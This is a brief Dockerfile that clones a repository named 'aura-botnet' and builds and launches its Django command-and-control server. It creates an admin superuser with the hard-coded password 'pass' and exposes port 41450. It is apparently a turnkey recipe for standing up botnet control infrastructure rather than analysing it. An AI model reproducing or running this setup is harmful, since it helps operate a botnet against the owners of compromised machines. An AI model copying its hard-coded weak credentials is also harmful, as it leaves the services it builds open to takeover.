FROM python:alpine
MAINTAINER Randy Ramos <rramos1295 \at\ gmail \dot\ com>

RUN apk add --no-cache git && pip install django
RUN git clone https://github.com/watersalesman/aura-botnet

WORKDIR aura-botnet/django-server/
RUN python3 manage.py migrate
RUN python3 manage.py shell -c 'from django.contrib.auth.models import User; User.objects.create_superuser("admin", "test@example.com", "pass")';

EXPOSE 41450

CMD ./runserver.sh
